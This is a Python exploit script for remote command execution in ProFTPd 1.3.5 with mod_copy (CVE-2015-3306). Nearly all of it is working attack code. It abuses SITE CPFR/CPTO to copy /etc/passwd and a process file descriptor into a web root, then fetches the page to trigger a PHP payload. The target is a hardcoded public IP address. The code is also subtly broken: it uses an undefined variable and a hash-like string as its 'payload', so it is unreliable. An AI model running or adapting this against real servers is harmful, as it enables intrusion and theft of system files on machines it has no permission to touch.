# Title: ProFTPd 1.3.5 Remote Command Execution
# Date : 20/04/2015
# Author: R-73eN
# Software: ProFTPd 1.3.5 with mod_copy
# Tested : Kali Linux 1.06
# CVE : 2015-3306
# Greetz to Vadim Melihow for all the hard work .
import socket
import sys
import requests

server = "210.65.105.194"
directory = "/var/www/html/"
evil = 'aa7da0eac65a5902a447a5e4c99f06fc'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, 2121))
print s.recv(1024)
print '[ + ] Connected to server [ + ] \n'
s.send('site cpfr /etc/passwd' + "\n")
print s.recv(1024)
s.send('site cpto ' + evil + "\n")
print s.recv(1024)
s.send('site cpfr /proc/self/fd/{}'.format(i) + "\n")
print s.recv(1024)
print s.send('site cpto ' + directory + 'index.html' + "\n")
print s.recv(1024)
s.close()
print '[ + ] Payload sended [ + ]\n'
print '[ + ] Executing Payload [ + ]\n'
r = requests.get('http://' + server + '/index.html') #Executing PHP payload through HTTP
if (r.status_code == 200):
    print '[ * ] Payload Executed Succesfully [ * ]'
else:
    print ' [ - ] Error : ' + str(r.status_code) + ' [ - ]'
